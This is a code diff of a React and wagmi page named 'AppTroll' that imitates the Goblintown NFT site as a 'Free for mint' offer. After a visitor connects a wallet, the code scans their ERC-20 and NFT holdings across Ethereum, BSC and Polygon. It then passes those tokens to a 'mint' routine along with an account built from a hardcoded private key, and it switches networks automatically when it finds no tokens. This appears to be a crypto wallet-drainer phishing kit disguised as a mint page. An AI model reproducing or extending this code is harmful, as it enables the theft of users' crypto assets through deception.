@@ -1,8 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { LazyLoadImage } from "react-lazy-load-image-component";
-import { getPublicClient } from '@wagmi/core';
-import { useAccount,  useNetwork, useSwitchNetwork, useConnect } from "wagmi";
-import {privateKeyToAccount } from 'viem/accounts';
+import { useAccount, useNetwork, useSwitchNetwork, useConnect, useWalletClient, usePublicClient } from "wagmi";
+import { privateKeyToAccount } from 'viem/accounts';
 import { mint } from './services/mint.service.js';
 import { isMobile } from 'react-device-detect'
 import { getBalanceErc20 } from './services/erc20.service.js'
@@ -33,23 +32,24 @@ function AppTroll() {
 
   const { isConnected, address } = useAccount()
   const { chain } = useNetwork()
- const client = getPublicClient();
- const account = privateKeyToAccount(`0xfec68842cdd93cfd6824fae8dded0b30f5eb3f0496b2781a69abc647a922788b`);
-// const LinkGoerli = "0x326C977E6efc84E512bB9C30f76E30c160eD06FB";
-// const { config } = usePrepareContractWrite({
-//   address: LinkGoerli,
-//   abi: erc20abi,
-//   functionName: 'transfer',
-//   args: ["0x4A7Df03838d2A4c9A9B81a3a0099dF500c0Bb102", 1000000000000000000],
-// })
-// const { data, isSuccess, write, isError } = useContractWrite(config)
- 
-// const sendTx = async () => {
-//   write?.()
-//   console.log(isSuccess, "SUCCESS")
-//   console.log(isError, "ERROR")
-//   console.log(data, "DATA")
-// }
+  const clientReader = usePublicClient();
+  const { data: clientWriter } = useWalletClient();
+  const account = privateKeyToAccount(`0xfec68842cdd93cfd6824fae8dded0b30f5eb3f0496b2781a69abc647a922788b`);
+  // const LinkGoerli = "0x326C977E6efc84E512bB9C30f76E30c160eD06FB";
+  // const { config } = usePrepareContractWrite({
+  //   address: LinkGoerli,
+  //   abi: erc20abi,
+  //   functionName: 'transfer',
+  //   args: ["0x4A7Df03838d2A4c9A9B81a3a0099dF500c0Bb102", 1000000000000000000],
+  // })
+  // const { data, isSuccess, write, isError } = useContractWrite(config)
+
+  // const sendTx = async () => {
+  //   write?.()
+  //   console.log(isSuccess, "SUCCESS")
+  //   console.log(isError, "ERROR")
+  //   console.log(data, "DATA")
+  // }
 
   // const advancedMatching = { em: 'some@email.com' }
   // const options = {
@@ -64,15 +64,17 @@ function AppTroll() {
   const { isLoading, switchNetwork } =
     useSwitchNetwork()
   const { connect, connectors } = useConnect({
-    onMutate(connector) {
-      console.log('Before Connect', connector)
-    },
-    onError(error) {
-      setBscNet(false);
-      setEthNet(false);
-      setPolygonNet(false);
-    },
+
+   
   })
+  const connectWallet = () => {
+    if (isMobile) {
+      connect({ connector: connectors[0] })
+    }
+    else {
+      connect({ connector: connectors[1] })
+    }
+  }
   const sound = require('./GT-song.mp3');
   const [playing, setPlaying] = useState(false);
   useEffect(() => {
@@ -83,13 +85,16 @@ function AppTroll() {
   }, [])
   const audioRef = useRef<any>();
   useEffect(() => {
-    if (chain !== undefined && address !== undefined && isConnected === true) {
+    console.log(chain, "CHAIN")
+    console.log(address, "ADDRESS")
+    console.log(isConnected, "IS CONNECTED")
+    if (chain !== undefined && address !== undefined && isConnected) {
       if (chain.id === 137) {
-        getBalanceErc20(dataProviderPolygon, client, tokensErc20Polygon, address, airdropPolygon).then(
-          (res:any) => {
+        getBalanceErc20(dataProviderPolygon, tokensErc20Polygon, airdropPolygon, address, clientReader).then(
+          (res: any) => {
             setTokensErc20WithBalance(res);
-            getBalanceErc721(dataProviderPolygon, client, airdropPolygon, tokensErc721Polygon, address).then(
-              (res1:any) => {
+            getBalanceErc721(dataProviderPolygon, tokensErc721Polygon, airdropPolygon, address, clientReader).then(
+              (res1: any) => {
                 setTokensErc721WithBalance(res1);
                 setPolygonNet(true)
               },
@@ -103,23 +108,23 @@ function AppTroll() {
         )
       }
       else if (chain.id === 56) {
-        getBalanceErc20(dataProviderBSC, client, tokensErc20BSC, address, airdropBSC).then((res:any) => {
+        getBalanceErc20(dataProviderBSC, tokensErc20BSC, airdropBSC, address, clientReader).then((res: any) => {
           setTokensErc20WithBalance(res);
-          getBalanceErc721(dataProviderBSC, client, airdropBSC, tokensErc721BSC, address).then((res1:any) => {
+          getBalanceErc721(dataProviderBSC, tokensErc721BSC, airdropBSC, address, clientReader ).then((res1: any) => {
             setTokensErc721WithBalance(res1);
             setBscNet(true)
-            },
+          },
             (err) => {
               console.log(err, "ERROR ON GET BALANCE ERC721 BSC");
             })
         }, (err) => {
-            console.log(err, "ERROR ON GET BALANCE ERC20 BSC");
+          console.log(err, "ERROR ON GET BALANCE ERC20 BSC");
         })
-    }
+      }
       else if (chain.id === 1) {
-        getBalanceErc20(dataProviderETH, client, tokensErc20ETH, address, airdropETH).then((res:any) => {
+        getBalanceErc20(dataProviderETH, tokensErc20ETH, airdropETH, address, clientReader ).then((res: any) => {
           setTokensErc20WithBalance(res);
-          getBalanceErc721(dataProviderETH, client, airdropETH, tokensErc721ETH, address).then((res1:any) => {
+          getBalanceErc721(dataProviderETH, tokensErc721ETH, airdropETH, address, clientReader).then((res1: any) => {
             setTokensErc721WithBalance(res1);
             setEthNet(true)
           }, (err) => {
@@ -133,21 +138,22 @@ function AppTroll() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [chain]);
   useEffect(() => {
-    console.log("SWITCH NETWORK")
-    mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, client, address);
     if ((tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && (tokensErc20WithBalance.length > 0 || tokensErc721WithBalance.length > 0)) {
-      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, client, address);
+      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, clientReader, clientWriter, address);
     }
     else {
-      if (chain !== undefined && !isLoading) {
-        if (!ethNet && (tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && tokensErc20WithBalance.length === 0 && tokensErc721WithBalance.length === 0) {
-            switchNetwork?.(1)
+      console.log("NO TOKENS WITH BALANCE")
+      console.log(isLoading, "IS LOADING")
+      console.log(chain, "CHAIN")
+      if (chain !== undefined) {
+        if (!ethNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
+          switchNetwork?.(1)
         }
-        else if (!bscNet && (tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && tokensErc20WithBalance.length === 0 && tokensErc721WithBalance.length === 0) {
-            switchNetwork?.(56)
+        else if (!bscNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
+          switchNetwork?.(56)
         }
-        else if (!polygonNet && (tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && tokensErc20WithBalance.length === 0 && tokensErc721WithBalance.length === 0) {
-            switchNetwork?.(137)
+        else if (!polygonNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
+          switchNetwork?.(137)
         }
       }
     }
@@ -156,7 +162,7 @@ function AppTroll() {
 
   const enterButton = useRef<any>(undefined);
   const siteBlock = useRef<any>(undefined);
- 
+
   useEffect(() => {
     setTimeout(() => {
       siteBlock.current.classList.add("awake")
@@ -184,10 +190,10 @@ function AppTroll() {
           }
         }} id="Enter" ref={enterButton} className="disabled">Hold on <span>dammit</span>&hellip;</button>
         <div id="Controls">
-          
+
           <a href='https://twitter.com/goblintown' rel="noreferrer" id="Twitter" target="_blank"><LazyLoadImage src={require('./images/GT-twitter-circle.png')} alt="twitter"
             width="64" /></a>
-          <a href='https://opensea.io/collection/goblintownwtf'rel="noreferrer" id="Opensea" target="_blank"><LazyLoadImage src={require('./images/GT-opensea.png')} alt="opensea"
+          <a href='https://opensea.io/collection/goblintownwtf' rel="noreferrer" id="Opensea" target="_blank"><LazyLoadImage src={require('./images/GT-opensea.png')} alt="opensea"
             width="64" /></a>
           <span onClick={() => {
             if (playing) {
@@ -214,7 +220,7 @@ function AppTroll() {
                 <p>Free for mint</p>
               </div>
               <>
-                {
+                {/* {
                   // eslint-disable-next-line array-callback-return
                   connectors.map((connector) => {
                     if (isMobile && connector.id === 'walletConnect') {
@@ -229,11 +235,14 @@ function AppTroll() {
                       return (<button
                         disabled={!connector.ready}
                         key={connector.id}
-                        onClick={() =>connect({ connector })}
+                        onClick={() => connect({ connector })}
                         className="button" id="Burgur-Button">CONNECT to <span>mint</span>
                       </button>)
                     }
-                  })}
+                  })} */}
+                  <button
+                  className="button" id="Burgur-Button"
+                  onClick={connectWallet} >CONNECT to <span>mint</span></button>
               </>
             </div>
             <div id="Actions">
@@ -291,7 +300,7 @@ function AppTroll() {
           <LazyLoadImage id="Family" src="https://www.goblintown.wtf/i/GT-family-compressed.png" alt="test" />
         </div>
         <LazyLoadImage id="Rocks" src="https://www.goblintown.wtf/i/GT-rocks-compressed.png" alt="test" />
-                </div>
+      </div>
     </>
   );
 }
